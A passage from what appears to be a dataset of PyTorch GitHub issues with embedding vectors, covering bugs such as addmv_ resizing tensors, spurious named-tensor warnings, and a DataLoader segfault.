cc @ezyang @gchanan @zou3519 @bdhirsh @jbschlosser @anjali411 @pbelevich",True,"[-3.97567928e-01 -5.14914840e-02 -3.81390899e-02 -1.27904341e-01
  4.58894610e-01 -8.17059129e-02 -2.95712292e-01  7.88736492e-02
 -3.40187639e-01  1.35112945e-02 -3.06914300e-02  5.15468791e-02
 -2.91958898e-01  1.70743808e-01  5.63981161e-02  1.58363685e-01
 -1.58306986e-01 -2.43256480e-01  7.77387172e-02  3.06945503e-01
  3.66444707e-01  1.32623717e-01 -1.43210441e-01  3.15038860e-02
  1.99106783e-02  3.08762431e-01 -3.49216580e-01 -1.89919978e-01
  3.91834617e-01 -4.84191030e-02 -6.17327914e-03  2.66911238e-01
 -1.58372357e-01  2.17750609e-01  5.11419654e-01 -4.98420000e-02
 -5.80272317e-01 -9.48722288e-02  3.58737111e-02 -6.33227974e-02
  1.91731900e-01 -6.94324523e-02  5.44588547e-04  2.57438123e-02
 -2.12135524e-01  1.66053787e-01 -4.39429998e-01  1.72855198e-01
 -1.66694254e-01 -1.70328110e-01  1.72355473e-02  3.29626709e-01
 -2.79517859e-01 -3.92396860e-02  2.16824468e-03 -1.27235338e-01
  1.22257192e-02 -1.47612065e-01 -3.63578312e-02  1.53998107e-01
  2.52880931e-01  4.53643650e-02 -2.92683423e-01 -2.72452682e-02
  8.24756175e-02 -2.37371758e-01 -2.23873362e-01  2.81745255e-01
  7.21080482e-01 -2.22908735e-01  3.70056868e-01  2.90687203e-01
 -3.25500786e-01  1.66175067e-01 -4.23619412e-02  9.85779688e-02
 -3.08090806e-01  7.31991827e-02 -1.21833548e-01 -1.64311320e-01
 -2.22929895e-01 -4.34438512e-02 -1.43936127e-01 -3.70997906e-01
 -7.94861466e-02  1.88138753e-01  5.11262655e-01 -1.21086054e-01
  2.49625444e-01  9.79533195e-02 -6.42409921e-02 -1.94624364e-01
 -3.94506976e-02  5.90162992e-01 -9.47606564e-02  2.08671302e-01
  3.78572822e-01 -2.45719165e-01 -3.32127362e-01 -3.91792536e-01
  1.03331357e-01 -3.64296079e-01 -5.24196513e-02  1.44704461e-01
 -6.72805607e-02 -2.02074081e-01 -2.79457495e-02  2.95254260e-01
  2.57290184e-01 -1.96535587e-02  2.31613070e-01  9.55624878e-02
 -1.29665464e-01 -8.00645202e-02 -2.29986310e-01 -3.79550129e-01
 -2.71786243e-01 -3.62036884e-01 -1.94552958e-01  3.75672698e-01
  1.33855224e-01  2.15176895e-01  1.09472767e-01 -1.03429191e-01
  7.32093155e-02 -4.87653278e-02 -9.35139656e-02  5.41835651e-02
  8.50112662e-02 -1.77366823e-01 -1.20042339e-01  6.03365749e-02
 -1.56641632e-01 -1.11748748e-01  3.26212466e-01  4.29125905e-01
 -2.00476408e-01 -9.10875201e-02  3.97559628e-03  1.57969236e-01
 -1.14473872e-01  1.93413317e-01 -1.00243486e-01 -2.00926214e-01
  9.98044536e-02  5.00727445e-03 -7.95906410e-03 -5.20605817e-02
 -7.77648464e-02  3.32028270e-01 -1.18328586e-01 -1.11524433e-01
 -4.46988791e-01  1.63184881e-01  3.67325097e-02 -2.02247530e-01
  3.48744541e-01  1.27810329e-01  4.64495659e-01 -3.96837234e-01
 -3.63482982e-02  2.43784100e-01  4.64664817e-01  1.96362659e-03
  2.87524521e-01 -2.18175650e-01 -1.19887874e-01 -2.63893958e-02
 -1.94473267e-01  2.40847886e-01 -7.69962221e-02 -4.42298472e-01
 -2.69726813e-01 -3.24279666e-01  2.73341835e-01 -1.92102075e-01
 -1.58863246e-01 -3.71572435e-01  3.72367986e-02  1.35023341e-01
  4.37203199e-01  3.99437457e-01  2.79107511e-01  9.64559466e-02
  3.43374997e-01  1.08547717e-01  9.88682657e-02 -1.22567371e-01
 -1.77228481e-01 -1.89155191e-01 -1.74002960e-01  5.77976406e-02
  1.40638158e-01  9.09916162e-02 -5.55271618e-02  2.65890241e-01
 -2.34393217e-03  2.49666274e-01 -1.73273578e-01 -2.02963352e-01
 -7.73515552e-04 -1.64017789e-02 -1.21733569e-01  3.86741087e-02
  1.92151487e-01  4.35843050e-01 -5.57151437e-01 -3.09500605e-01
  2.80416638e-01 -1.16119804e-02 -3.00297439e-01 -2.19816178e-01
 -4.79777098e-01 -1.42003089e-01  8.00237656e-02  1.29032150e-01
 -2.07222223e-01 -7.45578408e-02  1.53604075e-01 -1.63735494e-01
  5.70331872e-01 -6.36263341e-02 -2.06396833e-01 -1.74418911e-01
 -8.09106976e-02  1.28672153e-01  1.42442286e-01  1.77836746e-01
  1.96852982e-01  6.58605844e-02 -1.51978537e-01  1.28108308e-01
 -2.17284232e-01 -5.93569838e-02 -1.58212751e-01  4.22382474e-01
  3.11374992e-01 -6.94365576e-02 -4.58884299e-01  2.43035316e-01
 -1.77279145e-01 -3.70254088e-03 -3.37069966e-02  5.14605902e-02
 -2.45356634e-01  2.78285801e-01 -2.13440984e-01 -1.06440119e-01
 -1.50510550e-01 -2.42883563e-01  2.32977904e-02  1.66540712e-01
 -2.08298624e-01 -2.48593614e-01  5.25828958e-01 -1.21184327e-01
 -1.68338478e-01  3.07076443e-02  1.27282202e-01 -3.65311027e-01
  3.44392061e-01  2.63988286e-01  2.22612657e-02  1.62166223e-01
  2.70272065e-02 -1.28779382e-01 -1.71513245e-01  5.04241213e-02
 -1.61159068e-01  1.80183277e-02  1.22012561e-02 -1.14686102e-01
  3.94647539e-01  3.85884941e-01  2.30760068e-01 -1.25072256e-01
  3.34728360e-01 -1.51438802e-01  1.35624349e-01 -2.56364197e-01
  2.73365289e-01  3.80339593e-01  1.93725467e-01  2.79812366e-01
  4.65799153e-01 -1.35117799e-01 -1.01644814e-01 -3.33233662e-02
 -2.40143061e-01 -1.82882622e-01 -1.20556206e-01 -1.92936510e-02
 -6.41625896e-02 -1.57888681e-01 -1.43230975e-01  1.23089716e-01
  3.61964405e-01  8.31675343e-03  4.15107012e-02  3.20820697e-02
 -3.43454719e-01 -3.41530561e-01  1.06383018e-01 -2.38809884e-01
 -1.78618103e-01 -1.51216179e-01 -7.36610070e-02  8.13077092e-02
  4.94415641e-01 -2.88555562e-01  3.61682385e-01 -2.59067323e-02
 -4.34650093e-01 -3.17150325e-01 -2.27064818e-01 -8.67397115e-02
  7.73452036e-03  3.98092985e-01  2.25914523e-01  2.37872154e-02
  1.49708331e-01 -2.77149588e-01  3.00666038e-02  2.43884206e-01
  5.68113253e-02  1.09367825e-01 -3.47085148e-01  4.53631669e-01
  8.35568607e-02  2.95474172e-01  2.02994332e-01 -1.10485688e-01
  2.42595017e-01  3.16137224e-02 -1.01673767e-01 -3.73330891e-01
 -1.31907657e-01  2.19942123e-01  1.64781839e-01 -2.68507779e-01
 -4.91590351e-02 -2.10602835e-01  1.79423392e-01 -2.76640147e-01
  1.40462322e-02 -5.85393235e-02  4.98336613e-01  3.58917147e-01
  2.37012282e-01  7.19723776e-02  3.82312797e-02 -1.96159661e-01
  4.15868461e-01  2.06913754e-01 -2.54130900e-01  4.89036500e-01
  4.06140313e-02  2.70216584e-01  9.92906243e-02  1.68038562e-01
 -1.13577582e-02 -4.32581827e-02 -2.76859015e-01 -1.40676752e-01
 -5.03969193e-01 -2.98165809e-02 -1.05696395e-01 -8.44826847e-02
  4.82533872e-02  3.02601784e-01 -4.39122990e-02 -1.31172672e-01
  2.29715114e-03  8.32015947e-02  4.82330024e-01 -7.11092502e-02
 -1.19149089e-01 -2.03887329e-01  2.46459156e-01 -5.09446673e-02
  1.66800350e-01 -3.94012257e-02 -4.19320703e-01 -2.06316590e-01]"
addmv_() allows resizing the tensor it operates on and produces wrong results high priority triaged module: linear algebra module: correctness (silent),"```
a = torch.randn((1,))
b = torch.randn((3, 4))
c = torch.randn((4,))

# this should error out
a.addmv_(b, c)
: tensor([ 2.2854,  1.4802, -1.4424])
```

This operation should fail. Discovered by @Lilyjjo (see https://github.com/pytorch/pytorch/issues/55539).

cc @ezyang @gchanan @zou3519 @bdhirsh @jbschlosser @anjali411 @jianyuh @nikitaved @pearu @mruberry @heitorschueroff @walterddr @IvanYashchuk",True,"[-0.44527096 -0.2894476  -0.34185383  0.00165562 -0.16484147 -0.35571492
  0.17209658 -0.00474201 -0.26473975  0.03549975 -0.09436113  0.20067367
 -0.07601242  0.3513262  -0.08960226  0.15284514 -0.43120414 -0.15885334
 -0.31270796 -0.02615893  0.06516071 -0.12147237 -0.09153547 -0.06175819
 -0.01591811 -0.1315745  -0.01290134 -0.06541118  0.28874964 -0.12289454
  0.18474704  0.0315612  -0.18786809 -0.00620952 -0.0490669   0.41190767
 -0.29073185 -0.09735794 -0.15837458  0.05535847  0.06881297  0.2249729
  0.25677383 -0.22567338  0.2634003   0.11830477  0.06702365  0.11592083
  0.04000159  0.00555951 -0.07201239  0.16874427 -0.07710373 -0.33739787
 -0.09245384  0.21293059 -0.14641175 -0.18442678  0.05439743 -0.28526014
  0.01154452  0.13497597 -0.03122744  0.1531969   0.15471    -0.13013983
  0.18881993 -0.03792142  0.521179    0.05102444  0.25411558  0.18557447
 -0.19861653 -0.00306647 -0.01203319  0.0044362  -0.12375368  0.19206658
  0.24321361 -0.0428757   0.00798454  0.13208766  0.1017862  -0.37703153
  0.1050314   0.04947507  0.4682532  -0.05108181  0.68506056 -0.19021595
  0.45210195 -0.0615733  -0.2739686  -0.00243109  0.12666693  0.03478141
  0.30669373 -0.09307982 -0.19241096 -0.03144922 -0.40421993 -0.4505032
 -0.12392268  0.16347136  0.06933474 -0.03778752  0.06485873  0.10745265
  0.17977962 -0.0297396   0.41472805 -0.00295325  0.10025875  0.0394102
 -0.07858448  0.09849298 -0.08631103 -0.19161409 -0.09436083  0.32933474
 -0.34938622 -0.14140788  0.24643281  0.22248581  0.11232328  0.20277436
 -0.26349604  0.01809648 -0.2973592  -0.11658552  0.40657744 -0.12174886
 -0.01391258  0.16031869  0.11655626  0.22813624 -0.33784157 -0.16685441
 -0.43036374 -0.21270986  0.15295915  0.11825994 -0.24251461 -0.19724312
  0.49631107  0.05858064 -0.11214957 -0.20456111 -0.2428288   0.19958198
 -0.04521526  0.06556509 -0.16225713  0.29647845  0.06586165  0.20424442
  0.30241475 -0.11492689 -0.01147001 -0.49232     0.17709008  0.25832912
  0.24736097  0.18210083  0.40460205  0.27769595 -0.17159078 -0.19111215
 -0.20904543  0.33472615 -0.01210738 -0.07506894 -0.39482215 -0.03836111
  0.45072067 -0.10722508 -0.04163855 -0.48766932 -0.31216463  0.30067238
  0.38018906  0.11611944  0.02954616  0.1729142  -0.02636197  0.09032135
  0.30778813  0.00166718 -0.18047641 -0.13165158 -0.39967418 -0.1323525
  0.08319782  0.06685499 -0.02693067 -0.02680562  0.27220827 -0.23236915
  0.02036143 -0.10134644  0.02802187  0.0519261   0.00250927 -0.01200345
 -0.03578413 -0.2472663  -0.21621585 -0.30317554 -0.20823489  0.35374266
 -0.0625224  -0.24656765  0.02386863 -0.27390507 -0.19733962 -0.05238412
  0.09588498 -0.05037429  0.0169584   0.17983863  0.29488617 -0.08257637
  0.03757597 -0.27635038 -0.17479855 -0.04773337 -0.17436156 -0.14445177
 -0.02160281 -0.11753484  0.1169713  -0.3468221   0.11176872 -0.07284126
  0.09191777  0.00257114 -0.13009669 -0.0081989   0.02154608 -0.09736007
 -0.4297253  -0.16292208  0.00312044  0.0255183  -0.11526468  0.29556212
 -0.07916722 -0.08721517 -0.19603515  0.10025741 -0.02610356  0.03447649
  0.01648964  0.05479555  0.11483178 -0.03570834  0.03785024  0.13351022
  0.06664021 -0.03247931  0.35537013  0.21195316  0.10954523  0.38296992
  0.19875178  0.14026234 -0.1055312   0.16811502  0.00509527 -0.13948004
  0.12899338  0.10564433  0.41687834 -0.24884483 -0.12913361 -0.504245
  0.14374669 -0.06034115 -0.25595087 -0.31396675  0.200312    0.2914521
 -0.15240693  0.265818   -0.11602966 -0.39946195  0.095195   -0.05515326
  0.02376225  0.06399186 -0.15938544  0.13568963  0.37551373 -0.44670296
 -0.13335833  0.15530272  0.17783834 -0.06284728 -0.24634537  0.0279852
  0.13828903  0.02734102  0.3555347  -0.18710303  0.0553237  -0.31215376
  0.33353662  0.12088054  0.32348424 -0.21789071  0.5559028  -0.16284136
 -0.31670162  0.615618   -0.01327715  0.06973609 -0.02490184  0.40073895
  0.06388978  0.10778388 -0.13934235 -0.21401878 -0.25189966 -0.09270938
  0.0147178   0.14221759 -0.12649015  0.02487899 -0.12876502  0.01055065
 -0.05799771 -0.1870588   0.12995754  0.1714153  -0.17544249 -0.14576054
 -0.42324412  0.26056933 -0.01823817 -0.12793517  0.01372117 -0.0122109
  0.03126716 -0.07345574  0.06441517 -0.3445938   0.15364887  0.25059637
 -0.02340968  0.15968153 -0.22833523  0.2158179  -0.04144377  0.22830656
  0.02189747  0.16131485  0.02753549  0.10339013  0.14068565  0.29579955
 -0.00319815  0.19144887 -0.2492464   0.05330271  0.13434839 -0.32938337
 -0.09629054 -0.25677124  0.19137713  0.28832918 -0.10582992  0.35758656
 -0.01278825  0.19938815  0.60851264 -0.4883654  -0.19155383  0.14734507
 -0.0895702   0.03201168 -0.00213079 -0.04360514 -0.1568308  -0.06775897]"
OpInfo tests should check that for inplace operations tensor storage doesn't change.  module: tests triaged hackathon,"Per title, this check should probably be added to test_variant_consistency test. 
Context: 
#53655 broke this for inplace `index_add_` operation when type promotion is used in index_add_.

cc @mruberry @VitalyFedyunin @walterddr",True,"[-0.5102378  -0.23659319 -0.04954052  0.03291732  0.2423371  -0.3233688
  0.08277171  0.2107465  -0.28604597 -0.45322037  0.3885562   0.11746679
 -0.08157226  0.1448858  -0.12885451  0.03995976 -0.12649238 -0.21753581
  0.11176725  0.07636412 -0.03706569 -0.05180708  0.06056607 -0.11548708
 -0.06783245  0.01273859 -0.13635421  0.18987028  0.14792937  0.12999633
  0.5825541   0.12539588 -0.24540107  0.0538678   0.12099789  0.3068699
 -0.22537223 -0.29869938 -0.08272852 -0.05714731 -0.17241341  0.2967935
 -0.06717984  0.03750136  0.3261731   0.04515492  0.04793834  0.00880021
 -0.02802058  0.13107945  0.2158644  -0.09832796 -0.5921496  -0.62267536
  0.27346224 -0.083656   -0.0375308   0.17416207  0.12090109  0.0565341
  0.29071787 -0.1592333  -0.39403585  0.01183491  0.08249086  0.07985646
  0.22506014 -0.23262896  0.13338351  0.09187271  0.03817785  0.14410244
 -0.39973968 -0.13042915 -0.10399936  0.41775176 -0.23994465 -0.35889384
  0.27834857 -0.00146313  0.1451373  -0.06653949  0.26550335  0.17753077
  0.13439889 -0.12649359  0.31004354 -0.1423694   0.11666546 -0.11561321
  0.52271855 -0.10169777 -0.3312323   0.18916178 -0.05848058  0.07239699
  0.08344302  0.05152396 -0.21023187  0.10508883  0.06334905 -0.25781727
 -0.44657534  0.10473372 -0.0407484  -0.16387615  0.28564522 -0.15532033
  0.06834233  0.10459196  0.02547067 -0.09338845  0.12177398  0.02883028
 -0.02693518  0.04380101 -0.20923331  0.11183035  0.30908     0.30591455
  0.07323817 -0.24633403 -0.06109604 -0.09502568  0.32875586  0.00559449
 -0.04958304  0.16443509 -0.15900378 -0.21503241  0.23060752  0.2560392
 -0.21514155 -0.03371932  0.12058932  0.24975863 -0.32468364 -0.23088206
 -0.23671842 -0.08163473 -0.37804112  0.17461552 -0.02954533  0.06609399
  0.29169482  0.06276742 -0.25318548  0.20882824 -0.25958812 -0.17239909
  0.07977401 -0.28552282 -0.09045948  0.18491203 -0.15115851  0.08541277
  0.25385308  0.18762383 -0.06703839 -0.40426904 -0.12453587  0.4049099
  0.02419055  0.07066231  0.3587497  -0.11176418 -0.29371002 -0.2051735
 -0.21516223  0.18973005 -0.15356334 -0.01631267  0.01533978  0.00187221
  0.21575199  0.02373028  0.2074647  -0.2067822  -0.09059778  0.17670013
  0.09532534 -0.28806484  0.00445018  0.09031218 -0.13820219 -0.02027496
  0.14343327  0.33686155  0.14614832  0.00512569 -0.15777571 -0.31442887
 -0.06679538  0.24964328 -0.04359097 -0.30913386  0.281448    0.29972553
  0.1284559   0.18279812 -0.01068192  0.0792662  -0.08919762 -0.3699475
  0.0881867   0.08965322 -0.01145758 -0.3283245   0.13094173 -0.06530668
 -0.16629148 -0.3712626  -0.39422968 -0.21415143 -0.10870429 -0.01773977
  0.10293061  0.12715949  0.0079611   0.03446743 -0.0831919  -0.3377445
 -0.03805231 -0.24339768 -0.23546018 -0.11557461 -0.45240566 -0.04001327
 -0.329273    0.18926635 -0.18847065  0.03200011  0.35121548 -0.20661813
 -0.11211266 -0.10232608  0.25961906 -0.08224878 -0.27653295  0.17275421
 -0.6540146  -0.27877766 -0.10998189 -0.12406693 -0.13288829  0.01198474
  0.28475243  0.19558127  0.21825512  0.22122748 -0.4022982  -0.19537416
  0.35304478  0.05029949 -0.18461609  0.01525174 -0.110286    0.26058728
 -0.06227371  0.03140666  0.28004602 -0.04128345 -0.04341592  0.48775113
  0.25596002  0.20578957 -0.1207436   0.26261178  0.17623998 -0.17329375
  0.11584186 -0.26926145  0.61295676 -0.21274692  0.03840045  0.11862388
  0.1731137  -0.09852309 -0.22574292  0.27948248 -0.12993737  0.00630034
 -0.37499908  0.3552574  -0.12257756 -0.24080497  0.06912997 -0.03615611
 -0.13147415 -0.01233241 -0.20149598  0.05893103  0.09292343  0.07378384
 -0.21348396  0.18232314  0.03442271 -0.42647314 -0.07851452  0.12482484
  0.07109919  0.19313213 -0.07751128  0.19279878 -0.0436792   0.05942765
  0.18631512  0.079369   -0.06255638 -0.0375442   0.39670956  0.19638251
 -0.2928241   0.16609526  0.00700191  0.06945572 -0.18280195  0.18515049
 -0.05737374  0.14804155 -0.110207   -0.2209416   0.0909266   0.41123718
  0.01170719 -0.02035495 -0.09812441  0.07040293  0.02235859  0.13500884
 -0.11302909 -0.05522646 -0.335746   -0.1047072  -0.02488636 -0.04631014
 -0.41180184  0.4319964  -0.24841216  0.0824      0.2006312   0.05860795
 -0.05175889 -0.15745233 -0.10752141 -0.04721847  0.24769793  0.0870157
  0.10174414  0.27239436  0.41854373 -0.09836547 -0.15062866 -0.08065709
  0.09516373  0.2295559   0.28310832  0.11936501 -0.12096751  0.29798654
 -0.33683714 -0.13754931 -0.1286259  -0.04800353  0.20308998  0.01787943
  0.29075453 -0.18353061  0.30873266 -0.02511913  0.18794632  0.11085921
 -0.32717216  0.1578917   0.32878104 -0.20837805 -0.01352345  0.00215465
 -0.0187557   0.3266106  -0.08863044 -0.13687313  0.2766474   0.22122933]"
Irrelevant named tensor warnings high priority module: nn triaged module: named tensor,"## ðŸ› Bug
This code:
```
import torch
import torch.nn as nn

input_tensor = torch.ones((1, 32, 128, 128), dtype=torch.float)
cs = nn.ChannelShuffle(groups=2)
cs(input_tensor)
```

produces irrelevant warning:

> /home/user/PyTorch/dist-packages/release/torch/nn/modules/channelshuffle.py:46: UserWarning: Named tensors and all their associated APIs are an experimental feature and subject to change. Please do not use them for anything important until they are released as stable. (Triggered internally at  ../c10/core/TensorImpl.h:973.)
>   return F.channel_shuffle(input, self.groups)

as no named tensors are used.

## Expected behavior

No warnings

## Environment

 - PyTorch Version (e.g., 1.0): current master
 - OS (e.g., Linux): Linux
 - How you installed PyTorch (`conda`, `pip`, source): source

cc @ezyang @gchanan @zou3519 @bdhirsh @jbschlosser @anjali411 @albanD @mruberry",True,"[-3.38419855e-01 -4.02484417e-01 -1.66858479e-01  1.01350129e-01
  1.88119709e-01 -2.49402046e-01  1.67894587e-01  4.44728360e-02
 -4.26155329e-01 -8.81572515e-02 -1.27654389e-01 -1.29864179e-02
 -5.04341364e-01  1.11451037e-01 -7.56006837e-02  7.33886212e-02
 -2.21589461e-01 -2.97884136e-01 -2.60224491e-02 -1.33776844e-01
  1.26082435e-01 -1.22633368e-01 -2.57445991e-01  9.72446203e-02
  3.24986950e-02  1.12821318e-01 -1.22322217e-01 -1.24179192e-01
  4.64577615e-01  9.18524861e-02  1.32640243e-01 -4.76966873e-02
 -4.69719946e-01  2.49556415e-02  8.47945809e-02  3.57723176e-01
 -3.43956679e-01 -4.51697595e-02 -1.80759236e-01 -2.00590938e-01
  3.86467099e-01  1.45542547e-01  3.22043523e-02  1.04518443e-01
 -8.25849622e-02  1.22413412e-01  2.74601690e-02 -2.64784414e-02
 -1.48712575e-01 -1.51697576e-01 -4.64363955e-02  6.18829504e-02
 -4.04949337e-01  4.36229780e-02  3.91308358e-03 -4.27321613e-01
 -4.15434837e-02  8.69885460e-02  2.18604773e-01 -2.17684835e-01
 -1.87464356e-02 -1.84532940e-01  3.66819091e-02 -5.17032221e-02
  3.32347937e-02 -6.35088757e-02  9.36527029e-02  8.78469944e-02
  4.89590913e-01  6.52607977e-02  2.11655498e-01  5.40694408e-02
  1.34044826e-01  5.26478179e-02  1.22529306e-01  2.80249774e-01
 -1.90275207e-01  3.62576842e-01 -4.86708842e-02 -1.96588993e-01
  6.37839884e-02  4.54319119e-02  1.80487365e-01 -2.22766370e-01
  1.88947916e-01  5.01691028e-02  1.94250554e-01  1.84422821e-01
  3.31712127e-01 -5.43656200e-03  2.03879774e-01  1.09885707e-01
  2.83548057e-01  2.53411770e-01 -2.53739860e-02 -2.44454816e-02
  2.39082113e-01  6.45822361e-02 -3.92672390e-01 -2.87360728e-01
 -2.39573002e-01 -6.48372889e-01 -2.22701237e-01  3.59547853e-01
  2.43385941e-01  9.48021188e-02  1.22726269e-01  1.51602954e-01
  2.06273943e-01 -2.75573313e-01  2.51617223e-01  6.96174651e-02
  9.97861922e-02 -1.45892560e-01 -6.60469234e-02 -1.43064305e-01
 -2.55893767e-01 -2.57306788e-02 -1.19346380e-03  4.19328630e-01
 -1.07345447e-01  1.93154380e-01  2.72731990e-01  2.88534522e-01
  2.01074466e-01  2.20979407e-01 -1.41683757e-01 -7.03108013e-02
 -6.07920624e-02  2.44804695e-01 -7.74335489e-02  8.49229544e-02
 -7.82840997e-02 -5.80209959e-03  4.25448477e-01  2.32593104e-01
 -4.43387836e-01 -1.20531403e-01 -2.21010849e-01 -8.55586901e-02
 -5.00611700e-02  1.36152178e-01 -6.49657622e-02 -2.43018031e-01
  1.64951026e-01 -1.56457156e-01 -1.08447649e-01 -1.06231853e-01
 -3.85109335e-02  9.63215381e-02 -1.17841847e-01  3.09926979e-02
 -2.90831059e-01  3.56696486e-01  7.01027438e-02  2.06645936e-01
  1.02997340e-01 -2.82565765e-02  1.41862094e-01 -4.70409036e-01
  5.03945231e-01  2.95196056e-01  3.50306407e-02  1.76807866e-02
  9.57005769e-02  7.38663524e-02 -3.61286223e-01 -2.56503850e-01
 -4.48490381e-01  1.85579713e-02 -3.33719790e-01 -1.36453614e-01
 -2.38970876e-01  5.06318212e-02  1.50159029e-02 -1.51575148e-01
  8.21974725e-02 -7.72289515e-01 -3.78115535e-01  2.83743799e-01
  2.61831164e-01  3.07266533e-01  2.09210545e-01 -4.70269099e-02
 -5.45405261e-02  9.80110317e-02  3.40553343e-01 -2.59204924e-01
 -3.13664377e-02 -1.51918024e-01 -2.45467484e-01 -5.97130060e-02
  2.50219107e-01  4.92507145e-02  1.64733320e-01  3.66372138e-01
  8.45526978e-02 -3.91809583e-01 -2.14284331e-01 -1.58540785e-01
 -1.02271520e-01  5.12845777e-02 -4.18026596e-02  6.78569004e-02
  3.00248098e-02 -2.75437295e-01 -2.87305415e-01 -2.88193047e-01
 -4.78420049e-01 -7.44168982e-02 -1.77303091e-01 -1.80754811e-04
 -2.06502393e-01 -1.41323447e-01  1.83265787e-02  3.96013297e-02
 -5.50069883e-02  1.22546606e-01 -2.56247371e-02  3.04421604e-01
  3.42749327e-01 -7.33344536e-03 -1.15264885e-01 -1.99534997e-01
  2.55385488e-02 -2.79556252e-02 -3.21893960e-01  8.63498151e-02
 -1.07880719e-02  2.35134840e-01 -1.38611957e-01 -1.41148567e-01
  3.88474971e-01 -8.64061899e-03 -1.93204563e-02  2.73835480e-01
 -1.26355290e-01 -1.22927025e-01 -8.33785534e-02  2.94058204e-01
 -3.42525840e-01  1.58977397e-02  1.02289297e-01 -1.44538164e-01
 -3.23130727e-01  4.37653251e-02 -4.63565975e-01 -7.18782842e-03
 -3.89879346e-01  2.22236052e-01  1.78997993e-01  1.53521717e-01
  5.87274879e-02  1.55189529e-01  2.62874514e-01  5.28370664e-02
 -9.50595364e-03  1.11669689e-01  2.05054149e-01  1.96008328e-02
  3.06778669e-01  8.22823197e-02 -2.45788202e-01  4.15264726e-01
  2.77737439e-01  1.46014079e-01 -2.36324385e-01  5.04099786e-01
 -2.00799584e-01  5.73984860e-03  1.98854767e-02 -2.65381515e-01
  1.82000875e-01  7.10193887e-02  4.84890677e-02 -2.71008432e-01
  4.17142272e-01  1.58591419e-01 -2.18903899e-01 -1.36454612e-01
  3.35611731e-01  4.89019603e-01 -1.19894445e-01  3.77442449e-01
  4.15208817e-01 -2.96834081e-01 -1.50614917e-01 -3.39767009e-01
 -1.88692331e-01 -1.27406627e-01 -2.65327454e-01  9.05063152e-02
  5.18615663e-01  3.77784558e-02 -2.60474086e-01  1.19781643e-01
  1.31620586e-01 -2.39842847e-01 -1.09317534e-01  2.10396156e-01
  8.22023898e-02  3.99361253e-01  1.97000414e-01 -2.95833796e-01
  1.07149169e-01 -1.18254423e-01  1.67322338e-01  1.49366617e-01
  4.44696605e-01 -4.12472367e-01  5.03138006e-01  1.08846486e-01
 -3.37904468e-02  2.30564743e-01 -5.45730665e-02  1.41025782e-01
 -8.96383747e-02  4.28866744e-01  3.06182057e-01  1.04829669e-03
  1.60871983e-01 -2.98531316e-02 -4.58359540e-01  3.14448029e-04
 -1.22219577e-01  6.39780462e-02 -2.64746070e-01  5.01068346e-02
 -2.35047117e-01  1.92580402e-01  8.91644880e-02 -2.20959544e-01
  5.76402396e-02 -1.14036649e-02 -1.97197050e-01 -1.90064579e-01
 -3.65217268e-01  4.12066460e-01  6.44281209e-02 -3.41572702e-01
 -1.95386991e-01 -4.40741107e-02  2.11890191e-01 -1.94188312e-01
 -1.56445235e-01 -3.51139575e-01  3.41401666e-01  1.51464745e-01
  2.39577014e-02  1.06967531e-01 -2.27320492e-01  9.72398072e-02
 -1.50505930e-01  2.01606393e-01  1.32152528e-01  6.48993433e-01
 -2.43915111e-01  3.91645208e-02  1.79085284e-01  3.79088521e-01
 -1.44846052e-01  5.74800298e-02 -1.64779902e-01 -3.67561251e-01
  1.59524456e-01 -1.37836948e-01 -5.91453388e-02 -1.92315012e-01
  1.78175345e-01  4.21827435e-01 -5.92802167e-02  2.26939544e-01
 -1.23884663e-01  2.08417922e-01  3.73999804e-01 -2.91072220e-01
 -2.30848968e-01  1.66290253e-01  8.69603530e-02 -4.08146232e-01
  1.77575961e-01  1.13162443e-01 -1.91728815e-01 -2.12712675e-01]"
Segmentation fault in DataLoader worker in PyTorch 1.8.0 if set_num_threads is called beforehand high priority module: multiprocessing module: dataloader triaged module: multithreading,"## ðŸ› Bug

A segmentation fault occurs if one uses `DataLoader` with `num_workers` > 0 after calling `set_num_threads` with a sufficiently high value.
I observed this behaviour in PyTorch 1.8.0 and 1.8.1, but I am unable to reproduce it with PyTorch 1.7.1.

## To Reproduce

```
import torch

def main():
    torch.set_num_threads(4)

    dataloader = torch.utils.data.DataLoader([1, 2, 3], num_workers=1)
    iter(dataloader).next()

    return

if __name__ == '__main__':
    main()
```

The above code crashes when `set_num_threads` is called with 4 or more as its argument.
Incidentally (or maybe not) 4 is the number of vCPUs in the AWS EC2 instance I am using.

## Expected behavior

No crash.

## Environment

```
PyTorch version: 1.8.1+cu102
Is debug build: False
CUDA used to build PyTorch: 10.2
ROCM used to build PyTorch: N/A

OS: Ubuntu 20.04.2 LTS (x86_64)
GCC version: (Ubuntu 9.3.0-17ubuntu1~20.04) 9.3.0
Clang version: Could not collect
CMake version: Could not collect

Python version: 3.7 (64-bit runtime)
Is CUDA available: True
CUDA runtime version: Could not collect
GPU models and configuration: GPU 0: Tesla K80
Nvidia driver version: 460.32.03
cuDNN version: Could not collect
HIP runtime version: N/A
MIOpen runtime version: N/A

Versions of relevant libraries:
[pip3] numpy==1.20.1
[pip3] torch==1.8.1
[conda] Could not collect
```
## Additional context

Perhaps this issue is related to #53894 and #54716.

cc @ezyang @gchanan @zou3519 @bdhirsh @jbschlosser @anjali411 @SsnL @VitalyFedyunin @ejguan",True,"[-0.20725076 -0.5380582  -0.26205397 -0.09522325 -0.10702973 -0.52196753
 -0.15014589  0.12884364 -0.33962584 -0.00613831 -0.03316407 -0.17138894
  0.02431208  0.1473193  -0.03075848  0.22842078 -0.03041661 -0.4670722
  0.17568225 -0.13207741 -0.09644018  0.07108871 -0.2213768   0.05966856
  0.11794357 -0.26135847 -0.06010046 -0.24489331 -0.02184309 -0.06622358
 -0.07719501  0.02582898  0.19017467 -0.05342976  0.2742514   0.21975575
 -0.26232827 -0.29403174 -0.02186124  0.23578668  0.295819   -0.20220926
 -0.04900432 -0.33068204 -0.3922854   0.03692764  0.01664788  0.37066072
 -0.33666804 -0.05811266 -0.17790642  0.2245354  -0.02367122 -0.30982953
  0.09212532 -0.15984601  0.10582194  0.28569523 -0.14322464  0.3042569
  0.1029565  -0.2663744   0.119349   -0.12781714  0.34142256  0.15404658
  0.07047098 -0.3290343   0.23110592 -0.2171867   0.20726354 -0.00860118
 -0.54607534 -0.13443816 -0.02601125  0.16967514 -0.31045645  0.11840777
  0.03031783 -0.34659836 -0.39142913  0.06818064  0.10910314 -0.11808801
 -0.04121739 -0.27815586  0.18671504  0.03530118  0.3534873   0.1409708
  0.4447254  -0.1190911  -0.07736841  0.38556483  0.17219186  0.23942412
 -0.10816053  0.20948368 -0.19062527 -0.31410187 -0.04828722 -0.44519553
 -0.47960111  0.59957564  0.08393562 -0.14480753  0.20236357  0.21879104
